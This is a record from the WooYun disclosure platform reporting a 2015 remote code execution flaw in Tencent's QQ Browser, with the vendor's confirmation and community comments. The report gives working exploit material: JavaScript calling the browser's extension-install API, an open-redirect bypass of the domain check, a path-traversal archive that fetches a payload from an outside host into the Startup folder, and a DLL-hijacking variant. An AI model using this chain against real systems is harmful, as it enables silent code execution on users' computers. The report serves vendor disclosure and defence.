{"id": 43362, "wybug_id": "wooyun-2015-095664", "wybug_title": "QQ浏览器远程任意命令执行漏洞（附有分析和利用）", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2015-02-05 14:27", "wybug_open_date": "2015-05-07 18:00", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向公众公开  简要描述： 嗯，有点意思！ 详细说明：  1. 对于QQ浏览器来说，只要是qq.com的域名下的网页，就有权限调用 external下的一些API接口，比如：安装插件：window.external.extension.installExtension卸载插件：window.external.getExtension(\"\").uninstallExtension2. 对于window.external.extension.installExtension，其用法如下：\nwindow.external.extension.installExtension(\"插件GUID\",\"插件地址\",\"插件版本\",回调函数);\n一个实例：\nwindow.external.extension.installExtension(\"{CD36E3DB-304A-48EF-A8A2-D873F608D2AE}\",\"http://xxxx.qq.com/AAAAAAAA.qrx\",\"8.0.1.19\",function(){\talert(\"install ok\");});\n其中，插件地址要求是qq.com域下的地址方可。3. 看样子我们似乎可以安装任意插件，然而，QQ的浏览器插件实现，对插件内所调用的JS等含有功能代码的文件均有校验机制，这使得我们无法在插件内打包恶意的JS代码。4. 然而，QQ浏览器插件（qrx）本身就是一个压缩包，远程安装QQ插件的时候，QQ浏览器会首先解压这个压缩包，然后才是上一步的校验。校验这一步没什么问题，那解压缩这步会不会有问题呢？5. 于是，我们下载一个QQ浏览器插件，采用7zip打开， 拖入一个calc.exe到压缩包中，\n\n接着对calc.exe进行重命名：../../../../../../../../../calc.exe\n\n相当于我们在压缩包里打包了一个这样路径的文件：C:\\Users\\用户名\\AppData\\Roaming\\Tencent\\QQBrowser\\Extensions8\\{38D6C77F-66BE-413E-996C-85372DB1A510}\\8.0.0.2\\../../../../../../../../../calc.exe6. 我们将改造后的 1.qrx文件和index.php放到我们本地测试服务器（x.com）的根目录下。/1.qrx/index.php其中index.php代码为：\n<?php\techo file_get_contents(\"./1.qrx\");?>\n然后我们为了绕过window.external.extension.installExtension中插件URL的域名限制，我们在乌云以前的漏洞里找到了一个302跳转：http://tixing.qq.com/cgi-bin/jump?url=http://xxx.com/这个跳转本身的url参数依然存在域名判断限制，但是可以被我们可以轻松的用以下方式绕过。http://tixing.qq.com/cgi-bin/jump?url=http://x.com?qq.com/这也是我们最终构造好的插件下载地址：http://tixing.qq.com/cgi-bin/jump?url=http://x.com?qq.com/ --> 跳转到：http://x.com?qq.com/ --> 相当于 http://x.com/index.php--> 读取1.qrx的内容返回7. 我们随便打开一个QQ的网站，比如 qzs.qq.com/123 （网页不存在没关系）然后F12打开脚本控制台，运行下面的测试代码（会向C盘根目录写入一个calc.exe）：\n(function(){\tvar isWin7=/NT\\s+6/.test(navigator.userAgent);\twindow.external.getExtension(\"\").uninstallExtension(\"{CD36E3DB-304A-48EF-A8A2-D873F608D2AE}\",function(){\t\tif(isWin7){\t\t\twindow.external.extension.installExtension(\"{CD36E3DB-304A-48EF-A8A2-D873F608D2AE}\",\"http://tixing.qq.com/cgi-bin/jump?url=http://appmaker.sinaapp.com?.qq.com/1.qrx\",\"8.0.1.19\",function(){\t\t\t\talert(\"demo win7\");\t\t\t});\t\t}else{\t\t\t//xp\t\t\twindow.external.extension.installExtension(\"{CD36E3DB-304A-48EF-A8A2-D873F608D2AE}\",\"http://tixing.qq.com/cgi-bin/jump?url=http://appmaker.sinaapp.com?.qq.com/1.qrx\",\"8.0.1.19\",function(){\t\t\t\talert(\"demo xp\");\t\t\t});\t\t}\t});})();\n效果如下图所示：\n\n可以看到(Win 7 下需关闭UAC), 调用安装插件这个API后，确实在C盘根目录下写入了一个calc.exe文件。XP下也一样是可以的。\n\n8. 最后，我们要做的事情，就是找一个QQ域下的XSS， 这里我就不找了。因为这个漏洞的重点已经不在找XSS上了。。如果一定要我找一个补上，请留言。   漏洞证明：  1. win7下，关闭UAC的情况下，可以写入启动目录，calc.exe 重命名为 ../../../../../../../../../ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/calc.exe 即可。但是XP下，启动目录有中文，这个漏洞，在解压时，无法正常处理中文路径。2. 但是xp下，可以结合其它小问题来实现命令执行，比如dll劫持。如果QQ浏览器默认路径安装，自己创建一个dll，重命名为 ../../../../../../../../../Program Files/Tencent/QQBrowser/setupapi.dll用户访问恶意构造网页，安装恶意插件包，即会在QQ浏览器所在目录释放一个setupapi.dll，下次浏览器启动时，被劫持，如下图：\n\n   修复方案：  修复插件包安装相关代码。修复其它一些小问题。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-06 17:58 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-06 18:34 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  好屌    \n     2015-02-06 19:00 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  没有软妹币？？？    \n     2015-02-06 20:16 |    \t\t呼呼大侠 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 一只默默学习的菜菜)\t\t \n  路人甲~~~~~~~~~~~~~~~~~~~~    \n     2015-02-06 21:41 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  = =这漏洞很奇怪，为什么确认了还放在最新提交    \n     2015-02-06 22:41 |    \t\tLyleaks \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:9        | 这个人很聪明，什么也没有留下)\t\t \n  二哥~    \n     2015-02-07 09:48 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  估计二哥无误    \n     2015-02-07 10:56 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @blast 。。。    \n     2015-02-11 22:28 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @gainover 二哥提交的时候忘记登录了是不是    \n     2015-02-13 06:03 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  公开后学习下，好久没来乌云了，一上来心脏又跳出来了    \n     2015-04-30 20:09 |    \t\tGuardian \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:20        | I'm from the Internet and be here to hel...)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 8 个乌云币提前查看    )    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}